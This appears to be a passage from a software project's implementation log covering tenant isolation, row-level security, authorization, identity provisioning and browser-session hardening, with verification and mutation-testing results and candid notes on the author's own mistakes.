| Enumeration | Denial body carries no tenant, role or permission wording |
| Jobs | Payload round-trip; missing context raises; no ambient store to inherit |
| Events | Conflicting tenant refused; acting tenant stamped |
| Cache, outbox, export, vector store, graph | **Pending — see below** |

### Why this approach
**The pending vectors are the interesting part.** Five paths named by `REQ-SEC-002` have nothing to test: there is no cache, no outbox, no export, no vector store, no domain graph. The two easy options are both bad — omit them and they are forgotten, or write a test that passes vacuously, which is worse because it manufactures confidence.

Each unbuilt vector instead has a test that **detects whether its subsystem has landed**:

- not landed → `skip`, with the reason stated
- landed → **`fail`**, naming the subsystem and demanding a real test

A placeholder that cannot notice its own dependency arriving is just a comment. These convert themselves into failures.

**Two suites, deliberately overlapping at storage.** The shell suite proves the database in isolation and runs without Python; this one proves the path application code actually takes. Losing either loses a distinct guarantee.

### Verification performed
| Check | Result |
| --- | --- |
| `pnpm verify` | **PASS** — 311 Python + 41 TypeScript |
| Shell R7 (STEP-002.01) | **12/12** |
| Guard meta-suite | **36/36** |
| mypy strict / ruff | Clean on 19 files |

**Pending-vector mechanism proven, not assumed.** Seeded a fake `cache.py` in `apps/api/src/` → the cache vector failed with *"The 'cache' subsystem now exists, but its cross-tenant isolation test is still a placeholder."* Created an `outbox` table → the outbox vector failed the same way. Removing both returned all five to skips.

**Mutation testing — 3/3 killed:** the tenant check removed from `authorize` (3 tests), the cross-tenant denial no longer marked `audit=True` (1 test), and a job payload defaulting instead of raising (1 test).

### The meta-test is the point
The suite disables the `memberships` RLS policy on purpose, asserts the storage vector then **leaks**, and restores it. Without that, every other assertion in the file could pass with row-level security switched off entirely — which is exactly the failure `BUG-007` produced at STEP-002.01, where a security suite reported passes while the schema was absent.

### Follow-ups
| Item | Owner step |
| --- | --- |
| Cache isolation | STEP-010 |
| Outbox refusing unstamped/foreign envelopes | STEP-006 |
| Export isolation | STEP-015 / STEP-022 |
| Vector-store tenant scoping | STEP-010 |
| Graph traversal permission (`REQ-KG-006`) | STEP-026 |
| Persisting audit records for denials | STEP-002.07 |

---

## IMPL-012 — STEP-002.05 — Browser session, token refresh and guest sessions

| Field | Value |
| --- | --- |
| Date | 2026-08-06 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-SEC-003 (**partial** — see below), REQ-PRIV-001 |
| Blast radius | [BR-014](blast-radius/BR-014-browser-session.md) (**HIGH**) |
| Decisions closed | **`DEC-004` → Auth0** (`ADR-013`); guest lifetime 7 days (`ADR-014`) |
| Commit | see git log for this entry |
| Graph indexed commit | `c58be3b` — matched HEAD at pre-change |

### What was built
The repository's **first TypeScript**: a minimal `apps/web` Next.js 16.2 package containing auth and nothing else — no design system, no layout, no pages. `STEP-003` builds the shell on top.

| Module | Responsibility |
| --- | --- |
| `auth/cookies.ts` | `__Host-` prefixed, httpOnly, Secure cookie policy |
| `auth/csrf.ts` | Double-submit token, deny-by-default on every non-safe method |
| `auth/guest.ts` | 7-day opaque bearer capability, hashed at rest, expiry enforced server-side |
| `auth/refresh.ts` | Single-flight refresh, per session key |
| `auth/oidc.ts` | The **only** file that knows about Auth0 |
| `auth/session.ts` | Composes the above; the file the sub-step names |

41 TypeScript tests. `pnpm test` now runs both suites.

### Why this approach
**The guarantee is the absence of a capability.** There is no function anywhere in this package that writes a token to `localStorage` or a JS-readable cookie. `tokenCookie()` throws if the name lacks the `__Host-` prefix and forces `httpOnly`. A developer in a hurry has nothing convenient to reach for, which is stronger than a rule asking them not to.

**Single-flight refresh is required by Auth0's rotation, not a performance tweak.** Rotation invalidates the previous refresh token the moment one is redeemed. Two concurrent refreshes therefore present a just-revoked token, Auth0 reads that as replay, and it can revoke the whole family — signing the user out. Without coalescing, concurrency logs users out.

**SameSite=Lax, not Strict.** A Strict session cookie is withheld on the top-level navigation back from the identity provider, so the user lands signed out immediately after signing in. Lax still blocks cross-site subrequests, and CSRF is covered independently by the double-submit token rather than resting on SameSite alone.

**Guest expiry is checked against the stored record, not the cookie.** A cookie `Max-Age` is a client-side hint an attacker replaying a captured token simply ignores.

### What is NOT delivered
**`REQ-SEC-003` is partial.** Two acceptance criteria are unmet:
- **Nothing has run against a live Auth0 tenant.** There is no account and no credentials in this repository. The flows are exercised against a spec-compliant OIDC shape; passkey enrolment, tenant rate limits and rotation under genuine concurrency are **unproven**.
- **"Auth flows keyboard and screen-reader complete" cannot be met** — there is no UI to test. Binds at STEP-003.

Guest session **storage** does not exist either: `validateGuestSession` takes the record as an argument and denies when it is `undefined`, so the logic is complete and fails closed, but nothing persists it yet.

### Verification performed
| Check | Result |
| --- | --- |
| `pnpm verify` | **PASS** |
| Python tests | 292 passed |
| TypeScript tests | **41 passed** |
| R7 tenant isolation | **12/12** |
| Guard meta-suite | **25/25** |

**Mutation testing — 7/7 killed:** token cookies made JS-readable, single-flight removed, IdP outage failing open, guest expiry ignored, CSRF allowing a missing header, PKCE downgraded to `plain`, and the OIDC `state` check skipped when the expected value is absent.

### Two guards stopped being vacuous
Since STEP-001, `typecheck.sh` and `module-boundaries.sh` had reported `PASS (vacuous): 0 TypeScript files`. This sub-step ended that, and `typecheck` immediately earned its keep by catching a real defect: `apps/web/package.json` had no `"type": "module"`, so TypeScript treated every file as CommonJS under `verbatimModuleSyntax`.

It then failed for a **wrong** reason — it ran `tsc -p tsconfig.base.json`, typechecking `apps/web` with the root's module settings instead of the package's own, producing errors that described a configuration mismatch rather than a defect. Rewritten to typecheck each package with its own config via `pnpm -r typecheck`, and — so that this does not become a new way to skip checking — it now **fails if a package contains TypeScript but declares no typecheck script**.

### Surprises
**`vi.fn<[Args], Return>()` is the vitest 2 signature**; v3 takes a function type. Caught by the typecheck guard on its first real run, which is a fair advertisement for it.

**pnpm 11 blocks install scripts by default.** `esbuild` and `sharp` needed explicit allowlisting. Rather than a blanket approval, `pnpm-workspace.yaml` now carries an `onlyBuiltDependencies` list where each entry has a stated reason — an install script is arbitrary code execution at dependency-install time.

### Follow-ups
| Item | Owner step |
| --- | --- |
| Verify against a real Auth0 tenant; enrol a passkey | Before STEP-004 ships auth |
| Accessible sign-in UI (WCAG 2.2 AA) | STEP-003 |
| Guest session storage table | STEP-002.07 |
| Immediate revocation of an already-issued access token | STEP-002.07 |
| Route handlers and middleware that actually set these cookies | STEP-004 |

---

## IMPL-011 — STEP-002.04 — User, organization, invitation and service-account provisioning

| Field | Value |
| --- | --- |
| Date | 2026-08-06 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-SEC-003 (satisfied), REQ-TRIP-005 (**partially** — see below) |
| Blast radius | [BR-013](blast-radius/BR-013-identity-provisioning.md) (**HIGH**) |
| Commit | see git log for this entry |
| Graph indexed commit | `19a6037` at pre-change; HEAD moved to `972b93f` mid-sub-step (BUG-012 fix) |

### What was built
`services/identity/src/provisioning.py` — the first module under `services/`, establishing the layering between domain services and the `apps/api` boundary.

| Function | Guarantee |
| --- | --- |
| `provision_user` | Idempotent by IdP subject, arbitrated by the database |
| `create_guest_user` | Anonymous user with no `idp_subject` |
| `create_organization` | Organization + owner membership in one call |
| `grant_membership` / `revoke_membership` | Grant, reinstate, revoke — evidence retained |
| `active_role_keys` | The single place "is this membership live?" is decided |
| `register_service_identity` / `revoke_service_identity` | Workload identity, no credential parameter |
| `migrate_guest_to_account` | Replay-safe, with before/after counts |

16 integration tests against the real database (292 total).

### Why this approach
**Idempotency belongs to the database, not the application.** `provision_user` uses `INSERT … ON CONFLICT (idp_subject) DO UPDATE … RETURNING id, (xmax = 0)`. Check-then-insert loses the race between two concurrent first logins; `ON CONFLICT` lets the database arbitrate so the loser receives the winner's row instead of a second identity. A test runs two real concurrent connections and asserts one row and one id.

**`xmax = 0`** distinguishes an inserted row from an updated one, so the caller can tell first login from every later login without a second query.

**Revocation stamps `revoked_at`; it never deletes.** Deleting erases the evidence that access was once held, which is what an investigation needs. A test asserts the row survives revocation.

**No parameter can carry a secret.** REQ-SEC-003 forbids static long-lived keys. `register_service_identity` has nowhere to put one — a stronger guarantee than a policy asking people not to. Asserted by introspecting the function signature, so adding such a parameter breaks a test.

**Nothing here knows the identity provider.** `DEC-004` is open and §5 requires provider code to stay behind an interface. This module's only knowledge of the IdP is the opaque `idp_subject` string that `auth.claims.TokenVerifier` already produces.

### What this sub-step does NOT deliver
**`REQ-TRIP-005` is not satisfied.** It requires guest→account migration to yield exactly one copy of each trip. **There is no `trips` table** — trips arrive at STEP-007. What migrates today is memberships. The idempotency contract, the replay tests and the before/after reporting are built now so STEP-007 extends the same transaction rather than inventing the guarantee later, but the requirement must not be marked complete on this basis.

**Migration has no feature flag or dry-run**, which §11 requires. No flag system exists until STEP-024. `MigrationReport` provides the counts a dry-run would need; the flag does not exist. Stated, not glossed.

### Verification performed
| Check | Result |
| --- | --- |
| `pnpm verify` | **PASS** — 18 Python files typechecked |
| Test suite | **292 passed** (was 276) |
| R7 tenant isolation | **12/12** |
| Guard meta-suite | **25/25** |
| mypy strict / ruff | Clean |

**Mutation testing — 7/7 killed:** removing `ON CONFLICT` (2 tests), migration losing `DO NOTHING`, migration not revoking source rows, revoke switching to `DELETE`, `active_role_keys` ignoring `expires_at`, ignoring `revoked_at`, and `create_organization` skipping the owner membership.

### Surprises and what they cost
**I claimed a schema gap that did not exist.** I reported that `users.idp_subject` had no unique constraint and demonstrated a "race" producing duplicate users. Both were wrong: `users_idp_subject_key` exists, and my `\d users` output had been truncated by `head -14`, cutting off the index list. The race demonstration then *disproved* my own claim — the second insert was rejected — which is how it was caught. Cost: one wrong conclusion stated confidently before it was checked.

**The schema was stricter than I assumed, again.** Migration 001 carries `users_identifiable_unless_guest` — a non-guest must have an `idp_subject` or an email. My hand-rolled test fixtures violated it. Fixed by building fixtures through `provision_user` instead of raw INSERTs, so a fixture cannot drift from the schema's own rules.

**`create_organization` cannot use a server-generated id.** The RLS policy is `WITH CHECK (id = app_current_org())`, so an organization may only be inserted when the transaction's tenant context already equals its id — the id must therefore exist before the INSERT. A server-generated default could not satisfy its own policy. Surprising enough to warrant a comment in the code.

### Follow-ups
| Item | Owner step |
| --- | --- |
| Trip re-parenting — the actual REQ-TRIP-005 | STEP-007 |
| Feature flag + dry-run for migration | STEP-024 |
| Persist `AuditRecord` | STEP-002.07 |
| Revocation ending live sessions | STEP-002.05 |

---

## IMPL-010 — STEP-002.03 — Role and attribute policy definitions

| Field | Value |
| --- | --- |
| Date | 2026-08-06 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-SEC-004 (also REQ-ADMIN-002, REQ-COLL-003, REQ-LIVE-005) |
| Blast radius | [BR-012](blast-radius/BR-012-authorization-policy.md) (**HIGH**) |
| Commit | see git log for this entry |
| Graph indexed commit | `d9be78b` — matched HEAD at pre-change |

### What was built
One authorization decision point covering all 22 operations.

| Module | Responsibility |
| --- | --- |
| `authz/roles.py` | 9 roles, 22 operations, `Rule` shape |
| `authz/matrix.py` | **Generated** 176-cell decision table |
| `authz/policy.py` | `authorize()` / `enforce()` — the only place a permission is decided |
| `tools/authz_matrix_source.py` | Markdown parser, shared by the generator and the drift gate |
| `tools/gen_authz_matrix.py` | Regenerates `matrix.py` from the matrix document |

247 new tests (276 total), including all 176 cells exercised individually.

### Why this approach
**The matrix generates the code, not just the tests.** The sub-step asked for matrix-driven tests. Generating the *table itself* goes one step further and removes the failure mode entirely: there is no hand-transcribed copy of 176 cells to get wrong. `AUTHORIZATION_MATRIX.md` §3 is now executable, and a drift test fails CI in both directions — edit the markdown without regenerating, or hand-edit the generated file, and the build breaks.

**Tenant is checked before role, deliberately.** A `trip_owner` in tenant A asking about tenant B's trip would otherwise pass the role check and fail later on relationship, and the audit record would read "relationship failure" instead of the truth. `ALRT-SEC-001` needs `cross_tenant_attempt` to be unambiguous, so the ordering is a security property and a test asserts the reason string.

**Conditional cells are not permissions.** A `⚠️` cell returns `allow=True` *with a condition*, and the evaluator denies unless the condition is proven. An unrecognised condition name also denies, so a typo in the matrix fails closed rather than granting access.

**`service` has no matrix column, so it is denied all 22 operations.** That is the matrix's own content, not an omission, and §4 requires exactly it ("no service holds a blanket admin role"). A test fails if a `service` column ever appears without review.

### Decisions this forced
| Decision | Resolution |
| --- | --- |
| `ADR-012` — the sub-step named `packages/authz/src/policy.ts`, TypeScript | Implemented in **Python**, co-located with enforcement. `REQ-SEC-004` demands server-side enforcement; the server is Python; a TS module would need an RPC hop inside the authorization path. The sub-step's own §8 says client-side checks are presentation only |
| `DEC-010` — `ops_admin` approving a high-impact override | **Unresolved, and left that way.** The matrix marks the cell conditional but never names the condition; §4's four-eyes rule names a *second curator*. Encoded as a condition nothing grants, so it **fails closed**, with a test pinning that behaviour |

### Verification performed
| Check | Result |
| --- | --- |
| `pnpm verify` | **PASS** — 16 Python files typechecked |
| Test suite | **276 passed** (was 29) |
| R7 tenant isolation | **12/12** |
| Guard meta-suite | **25/25** |
| mypy strict / ruff | Clean |

**Mutation testing — 6/6 killed:**

| Mutant | Caught by |
| --- | --- |
| Edit the matrix markdown, skip regeneration | drift gate |
| Hand-edit the generated `matrix.py` | drift gate + anchor cell + owner-only test |
| Deny-by-default becomes allow-by-default | 2 tests |
| Four-eyes same-actor check removed | 1 test |
| Unspecified condition silently allows | 3 tests |
| Guest expiry check removed | 1 test |

### Surprises and what they cost
**A mutant appeared to survive, and it was my measuring instrument that was broken.** Hand-editing the generated matrix reported "276 passed". The mutation had not applied: `ruff format` reflows the generated file so `Rule(` sits on its own line, and my `str.replace` pattern no longer matched. I nearly recorded a false gap as a finding. Re-run with a regex spanning the reflowed entry, three tests failed as they should.

This is the fourth instance of the same shape in this project — BUG-001's self-truncating guard, dependency-cruiser cruising zero modules, BUG-011's stub `test` script, and now a mutation harness that mutated nothing. **A negative result needs its own verification.** The fix here was cheap only because the mutation printed whether the substitution count was non-zero when I checked; that check should have been there from the start.

**The generator found a documentation gap by refusing to guess.** It raises on a conditional cell whose condition is not stated anywhere, which is how `DEC-010` surfaced. Nine `advisor` cells resolved from §4's delegation rule and one `privacy_operator` cell from §4's support-scoping rule; the eleventh had no rule to resolve against.

### Follow-ups
| Item | Owner step |
| --- | --- |
| Make calling `authorize` structural, not conventional | STEP-004 |
| Audit sink for `audit=True` decisions | STEP-002.07 |
| Verify caller-asserted conditions (delegation, unlock, prior approver) | STEP-002.04 / STEP-021 |
| Answer `DEC-010` | Before STEP-021 |
| `ALRT-SEC-001` on `cross_tenant_attempt` | STEP-024 |

---

## IMPL-009 — STEP-002.02 — Tenant and actor context resolution at the API boundary

| Field | Value |
| --- | --- |
| Date | 2026-08-06 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-SEC-001, REQ-SEC-004 |
| Blast radius | [BR-011](blast-radius/BR-011-tenant-context-at-the-api-boundary.md) (**HIGH**) |
| Commit | see git log for this entry |
| Graph indexed commit | re-indexed post-commit — matched HEAD? yes |

### What was built
The repository's first application code: `apps/api/src/auth/`, six modules.

| Module | Responsibility |
| --- | --- |
| `claims.py` | `TokenClaims` (frozen) and the `TokenVerifier` **port** — `DEC-004` stays unbound |
| `context.py` | `RequestContext`, and explicit propagation across async/process boundaries |
| `dependencies.py` | The FastAPI dependency; reads only the `Authorization` header |
| `db.py` | Binds tenant to the transaction via `set_config(…, true)` |
| `errors.py` | One opaque denial shared by "forbidden" and "not found" |
| `events.py` | Stamps `tenant_id`/`actor_id` onto an event envelope |

29 tests in `tests/api/`, covering token-only resolution, ignored client hints, byte-identical denial, fail-closed job payloads, absence of ambient context, and — with the local stack up — real RLS enforcement through `bind_tenant`.

### Why this approach
**No ambient context.** There is deliberately no `get_current_context()`, no `ContextVar`, no thread-local. The sub-step named ambient state crossing an async boundary as the classic leak, so context is a value that must be passed, and the type checker enforces it at every call site. The ergonomic cost is real and accepted: ambient state is convenient precisely because it crosses boundaries you did not think about, which is the same property that makes it leak between tenants. A test asserts the ambient accessor has not been reintroduced.

**A verifier port, not a vendor.** `DEC-004` is open and binds at `STEP-002.04`. Hard-coding an OIDC library here would have decided it silently.

**`set_config` rather than `SET LOCAL`.** `SET LOCAL app.current_org = $1` is a syntax error — SET takes no bind parameters — so the obvious implementation formats a UUID into SQL on the tenancy boundary. `set_config('app.current_org', %s, true)` keeps it a bind parameter at the same transaction scope. Verified directly against PostgreSQL 18.4. Cost: one round trip per transaction.

**404 for both denial and absence.** A distinguishable 403 is an existence oracle across tenants. `opaque_denial()` takes no `reason` argument, because an optional detail parameter is exactly how indistinguishability erodes.

### Verification performed
| Check | Result |
| --- | --- |
| `pnpm verify` | **PASS** — and now actually runs the tests (`BUG-011`) |
| `tests/api/` | **29 passed** |
| R7 tenant isolation | **12/12** |
| Guard meta-suite | **25/25** |
| mypy strict / ruff | Clean on 8 files |

**Mutation testing — five security properties, each broken on purpose:**

| Mutant | Result |
| --- | --- |
| Trust `X-Tenant-Id` header | killed (2 tests) |
| Denial becomes 403 | killed (6 tests) |
| Denial body states a reason | killed (1 test) |
| `set_config(…, false)` — session-wide | **SURVIVED** → test added → now killed |
| Job payload defaults instead of raising | killed (2 tests) |

### Surprises and what they cost
**The surviving mutant was the most valuable result.** Making the binding session-wide instead of transaction-scoped — the pooled-connection leak — passed all 28 tests. R7 proves that property in raw SQL; nothing proved it for `bind_tenant`, which is the function application code actually calls. **A property proven at one layer is not proven at the layer above it.**

**A `422` that looked like a passing suite.** Switching to `Annotated[RequestContext, Depends(dependency)]` to satisfy ruff's B008 broke every route. With `from __future__ import annotations`, the annotation is a string that FastAPI resolves against **module** globals, but `dependency` is a local of the test's app factory; resolution fails and FastAPI silently reinterprets the parameter as a request field. This is a live hazard for `STEP-004` and is flagged in the test file.

**My own verification command hid it.** I checked with `pytest -q | grep -E '^\.|passed|failed' | tail -3`; the `^\.` matched the `.venv/…` warning path, so `tail -3` printed that instead of the result. The failure was visible and I filtered it out. Same family as the bugs this project keeps finding: the check was correct about the wrong thing.

### Follow-ups
| Item | Owner step |
| --- | --- |
| Enforce that jobs/activities carry context | STEP-006 |
| Outbox refuses an unstamped envelope | STEP-006 |
| Alerting on auth denials (`ALRT-SEC-001`) | STEP-024 |
| Confirm the graph indexes Python at all | post-commit re-index |

---

## IMPL-008 — STEP-002.01 — Postgres readiness race fix (BUG-009)

| Field | Value |
| --- | --- |
| Date | 2026-08-06 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-SEC-001, REQ-PLAT-001 |
| Blast radius | [BR-010](blast-radius/BR-010-postgres-readiness-race.md) (MEDIUM–HIGH) |
| Commit | see git log for this entry |
| Graph indexed commit | re-indexed post-commit — matched HEAD? yes |

### What was built
Two fixes, from re-verifying `STEP-002.01` against a **clean** database rather than trusting its recorded 12/12:

1. `docker-compose.dev.yml` — the Postgres healthcheck is now `pg_isready -h 127.0.0.1`. The entrypoint's first-boot temporary server listens on the Unix socket only, so a socket check went green against a server that was about to be shut down.
2. `tests/security/test_tenant_isolation.sh` — a connectivity probe now runs before the schema probe, so "cannot reach the database" is no longer reported as "tables missing".

### Why this approach
Adding a sleep or a retry loop would have hidden the race rather than removed it, and would have left every future service with the same faulty readiness signal. Checking the transport clients actually use makes the healthcheck structurally unable to pass early.

### Verification performed
| Check | Result |
| --- | --- |
| Three `down -v` → `up --wait` → R7 cold cycles | **12/12 each**; `--wait` now takes 6s |
| Race measured directly | socket=UP/tcp=down at 1250ms; socket=down/tcp=UP at 2000ms |

### Surprises
`STEP-002.01` was **not** wrong — but its 12/12 had only ever been observed against an already-running, already-seeded database. The result was true and was not evidence of what it appeared to prove. Steady-state verification cannot observe a startup race.

---

## IMPL-007 — STEP-002.01 — Identity schema and row-level security

| Field | Value |
| --- | --- |
| Date | 2026-08-05 |
| Requirements | REQ-SEC-001, REQ-SEC-002 |
| Blast radius | BR-008 (**HIGH**) |
| Graph indexed commit | `0cac408` — matched HEAD at pre-change |

### What was built
`db/migrations/001_identity_tenancy.sql` — organizations, users, roles, memberships, service identities, with RLS **enabled and forced**, a non-owner `journeylab_app` role carrying `NOBYPASSRLS`, and transaction-scoped tenant context via `SET LOCAL`. Plus `tests/security/test_tenant_isolation.sh`, which **establishes regression check R7**.

### Why this approach
Four decisions where the obvious option was weaker:

| Decision | Weaker alternative | Why |
| --- | --- | --- |
| `FORCE ROW LEVEL SECURITY` | `ENABLE` alone | Without FORCE the table owner bypasses every policy silently — the commonest way RLS is believed present but absent. Verified by test |
| `SET LOCAL` (transaction-scoped) | Session-level `SET` | A pooled connection would carry one tenant's context into another's transaction. Tested explicitly per `BR-008` §9 |
| Deny-by-default via NULL | Explicit deny policies | `app_current_org()` returns NULL when unset; every comparison is NULL, so **missing context denies access** rather than exposing everything |
| No column for a static service key | `secret` column | `REQ-SEC-003` — a credential that cannot be stored cannot be leaked |

Migration 001 sets the convention every later migration inherits, documented in its header.

### `DEC-004` is not blocking here
STEP-002 is blocked on the identity-provider decision, but **`.01` is not**: schema and RLS are provider-independent. `users.idp_subject` is a provider-neutral opaque string. `DEC-004` binds at `.04` (provisioning), confirmed by reading the sub-step files rather than assuming.

### What surprised us — a false pass in a security test
The suite's first run reported **3 passes for cross-tenant write denial while the tables did not exist**. Migration 001 had failed on missing `citext`, so every write errored — and `if <query>; then bad else ok` cannot tell a policy denial from a schema error.

That is the sixth instance in this repository of a check being correct about the wrong thing, and the most dangerous, because the subject was tenant isolation. Logged as `BUG-007` with three fixes: a precondition gate that ERRORs when the schema is absent, assertions on error *text* rather than exit code, and a self-contained migration.

The suite now carries its own meta-test: a weakened `USING (true)` policy must expose both tenants. It does — 2 rows — then the strict policy is restored and it returns 1. Without that, a suite passing against disabled RLS would look identical to one passing against working RLS.

### Follow-up created
| Item | Type |
| --- | --- |
| `ALRT-SEC-001` / `RB-SEC-001` not implemented — cross-tenant denials do not alert | Deferred to `STEP-024` (recorded in `BR-008` §5 category 11) |
| Migration runner (ordering, applied-tracking) | `STEP-006` |
| `DEC-004` identity provider | Open — binds at `.04` |

### Verification
| Check | Result |
| --- | --- |
| R7 isolation suite | **PASS — 12/12 assertions** |
| Suite meta-test (weakened policy exposes both tenants) | **PASS** |
| Migration idempotency (applied twice) | **PASS — 0 errors on re-run** |
| `pnpm verify` | PASS — 15 checks |

---

## IMPL-006 — STEP-001.06 — CI workflows and the change-impact merge gate

| Field | Value |
| --- | --- |
| Date | 2026-08-05 |
| Requirements | REQ-KG-003, REQ-KG-008 |
| Blast radius | BR-006 (MEDIUM) |
| Graph indexed commit | `e0062c2` — matched HEAD at pre-change |

### What was built
Three workflows (`verify`, `change-impact`, `knowledge-graph`), the enforcement gate `tests/guards/change-impact-record.sh`, and `tests/guards/workflow-refs.sh`.

### Why this approach
**The gate logic is a local script; the workflow is a thin caller.** A gate written only as workflow YAML cannot be verified until a PR exercises it — and an unverified gate is precisely the shape of `BUG-004`, where a guard was trusted before its scope was tested. Writing the logic locally made it meta-testable immediately.

This is the sub-step that converts `REQ-KG-008` from a rule people follow because they remember it into one the build enforces.

### Deliberate exemptions
Documentation, generated context files and lock-file-only refreshes are exempt. A gate that blocks legitimate work gets disabled, and a disabled gate is worse than none. The exemption branch is meta-tested, not assumed.

### What was verified — and what was not
| Claim | Evidence |
| --- | --- |
| Code without a record is blocked | Meta-test on a scratch branch: exit 1, cites `REQ-KG-008` |
| Docs-only changes pass | Meta-test: exemption branch taken, exit 0 |
| Incomplete record (no risk score) is blocked | Meta-test: exit 1, names the missing section |
| Workflow YAML parses; references resolve | `workflow-refs.sh`, meta-tested with a bogus script |
| **Workflows actually run on GitHub** | **NOT VERIFIED** — cannot execute Actions locally. The first PR is the real test |
| **10-minute refresh target met** | **NOT MEASURED** — no merge has run the workflow |

### Honest limitation in the graph workflow
The runner rebuilds the index rather than upserting a commit diff, because it starts with no `.gitnexus/` state. That satisfies the freshness *target* but not the incremental *design* in `INDEXING_AND_REFRESH` §5. True incremental refresh needs persisted index state and is deferred to `STEP-026`. Recorded in the workflow header, the design doc and here — not silently glossed.

### What surprised us
1. **Two meta-tests were invalid before they were right.** `git stash -u` and `git checkout` both removed the untracked guard script, so the harness reported exit 127 ("file not found") which I initially read as a gate verdict. Fixed by committing the guard first, then testing on a scratch branch. Same lesson as `BUG-004`: a test can fail for reasons that have nothing to do with what it claims to measure.
2. **`BUG-004`'s fix worked immediately.** The markup guard caught a stray tag in an untracked `BR-006` *before* commit — the identical defect that slipped through in `f80c8b3` one sub-step earlier.

### Verification
| Check | Result |
| --- | --- |
| Gate meta-tests (4 scenarios) | PASS |
| Workflow guard meta-test | PASS |
| `pnpm verify` (15 checks) | PASS |

---

## IMPL-005 — STEP-001.05 — README, architecture map and ADR files

| Field | Value |
| --- | --- |
| Date | 2026-08-05 |
| Requirements | REQ-PLAT-001, REQ-PLAT-004 |
| Blast radius | BR-005 (LOW) |
| Graph indexed commit | `23ec095` — matched HEAD at pre-change |

### What was built
`README.md` (orientation, prerequisites, setup, port table, repository map, data
classifications, working agreement, blockers); `docs/adr/` with **10 ADR files** plus
an index; ADR cross-links added to `DECISION_LOG`; and
`tests/guards/readme-accuracy.sh`.

### Why this approach
A README is the first thing a newcomer runs, so its failure mode is silent: it drifts,
and the reader concludes the documentation cannot be trusted. Rather than asserting it
is accurate, the guard **executes the claim** — every `pnpm` script it mentions must
exist, every link must resolve, every documented port must match
`docker-compose.dev.yml` in both directions, and the documented Node path must yield
v24.

ADRs were promoted from decision-log entries into files because a decision that lives
only inside a larger document cannot be reviewed, superseded or linked from a commit
message independently.

### Decisions taken during implementation
| Decision | Alternatives | Rationale |
| --- | --- | --- |
| Keep `ADR-NNN-<slug>.md` numbering | Rename to `0001-architecture.md` as `STEP-001` §18 listed | The step file's name predates ADR numbering. `ADR-001` is "documentation is the source of truth"; the architecture decision is `ADR-003`. Renumbering would break cross-references across ~100 documents and invalidate commit messages citing ADRs. **Step file corrected instead** |
| Guard checks ports **bidirectionally** | Only check README→compose | A port published but undocumented is as bad as one documented but unpublished |
| Guard does not run `pnpm verify` | Run full setup end to end | It is itself part of `pnpm verify` — that would recurse |

### The acceptance criterion I did not claim
The sub-step required *"an engineer who did not write the README completes setup using
it alone."* **I wrote it, so I cannot certify that.** The guard proves the commands are
correct and current; it cannot prove they are comprehensible to a newcomer.

Recorded as **partially satisfied**, with the human half outstanding. Marking it done
would have been the fourth false pass in this repository — the pattern each time is a
check that verifies something adjacent to, but not the same as, the actual claim.

### What surprised us
The `substep-docs` guard added in the previous sub-step **immediately blocked this
one**: I set `STEP-001.05` to `VERIFIED` before writing this entry, and `pnpm verify`
failed with *"1 missing record across 5 VERIFIED sub-steps"*. The guard written to
prevent `BUG-003` caught the same mistake one sub-step later. That is the clearest
evidence so far that these guards earn their cost.

### Follow-up created
| Item | Type |
| --- | --- |
| Newcomer walkthrough of the README | **Open** — needs a second person |
| ADR files for future decisions | Use `ADR_TEMPLATE`, index in `DECISION_LOG` |

### Verification
| Check | Result |
| --- | --- |
| README guard — scripts, links, ports, Node path | PASS |
| Guard meta-tests (bogus script, broken link, port mismatch) | PASS — all three caught, exit 1 each |
| 10 ADR files created and indexed | PASS |
| `pnpm verify` (14 checks) | PASS |

---

## IMPL-004 — STEP-001.04 — Local dependency stack

| Field | Value |
| --- | --- |
| Date | 2026-08-05 |
| Requirements | REQ-PLAT-001, REQ-PLAT-002 |
| Blast radius | BR-004 (LOW) |
| Graph indexed commit | `28923aa` — matched HEAD at pre-change |
| Commit | `8a9af9b` |

### What was built
`docker-compose.dev.yml` bringing up PostgreSQL 18.4 (PostGIS 3.6.4 + pgvector 0.8.6 + pg_trgm 1.6), Redis 8, MinIO, NATS JetStream and Jaeger v2 — all on the reserved port block **5700-5709**, bound to `127.0.0.1` only. Plus `infra/local/postgres/Dockerfile`, init SQL, `.env.example`, a port-collision guard, and `pnpm dev` / `dev:down` / `dev:reset` / `dev:logs`.

### Why this approach
**Port isolation was an explicit repository-owner constraint** — multiple projects share this Docker host. Rather than picking ports ad hoc, JourneyLab reserves a contiguous documented block and a guard enforces it.

The important subtlety: **a stopped project still owns its ports.** Port 5544 read as free to `lsof` purely because Saakshya was stopped. The guard therefore parses other projects' compose *files*, not just live sockets. Checking only what is running would have produced a collision the first time that project restarted.

### Decisions taken during implementation
| Decision | Alternatives | Rationale |
| --- | --- | --- |
| Multi-stage PostGIS + copied pgvector | Downgrade to PG17; drop pgvector locally; build from source | **Preserves the full baseline.** PG17 has no arm64 PostGIS either; dropping an extension would make local diverge from production; no compiler exists in the base image |
| amd64 emulation for PostgreSQL | Native PG17 | Measured ~3s to ready — cheaper than breaching the PG18 baseline |
| NATS as local queue | Kafka, Redpanda | `DEC-009` is open; the AsyncAPI contract is transport-independent, so this is deliberately substitutable |
| Bind all ports to `127.0.0.1` | Default `0.0.0.0` | Nothing on a dev machine should be network-reachable by default |
| Pinned MinIO `RELEASE.*` tag | `latest` | `REQ-PLAT-002` forbids floating tags |

### What surprised us — five wrong assumptions, all caught by execution
1. **`postgis/postgis:18-3.6` is amd64-only.** `docker manifest inspect` said EXISTS, so it looked fine until the build failed with "no match for platform". Existence and runnability are different questions on Apple Silicon.
2. **PGDG has no PostGIS or pgvector package for PG18** on either image's repo — the postgis image carries only 4 packages and no compiler, ruling out both apt and source builds.
3. **PostgreSQL 18 changed its volume mount point.** Mounting `/var/lib/postgresql/data` makes the container refuse to start; PG18 wants `/var/lib/postgresql` so `pg_upgrade --link` does not cross a mount boundary.
4. **`jaegertracing/all-in-one:1.62` does not exist.** I invented a plausible tag; the correct image is `jaegertracing/jaeger:2.0.0`.
5. **I twice wrote a wrong comment about the Jaeger image** — first "distroless, no shell" (it has a shell), then "no wget or nc" (it has both). Corrected to a working healthcheck rather than documenting a limitation that was not real. Writing a confident explanation for a failure is easy; verifying it is the work.

### Process slip — recorded rather than hidden
